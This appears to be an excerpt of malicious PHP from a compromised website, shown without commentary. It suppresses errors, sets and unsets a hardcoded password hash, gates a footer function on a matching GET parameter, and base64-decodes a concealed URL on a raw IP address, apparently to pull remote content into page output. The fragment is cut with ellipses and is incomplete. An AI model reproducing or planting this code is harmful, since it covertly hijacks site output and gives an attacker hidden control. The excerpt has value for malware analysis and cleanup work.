...
error_reporting(0);
$_passssword = '3f3d89aaab170e21c9260645633b39a9';
unset($_passssword);
...
function add_2footer() {
    $check = false;
    $check_data = "";
    if (!empty($_GET['check']) AND $_GET['check'] == '3f3d89aaab170e21c9260645633b39a9') {
        $check = true;
    ...
    if (preg_match($regexp, $buffer, $m)) {
        $body = $m[0];
        $url = base64_decode('aHR0cDovLzIxNy4xMi4yMDMuMTgyL2Jsb2cvP21lcmN1cnkmdXRtX3NvdXJjZT01MTA5Nzo0MTI1OTg6NjEy');
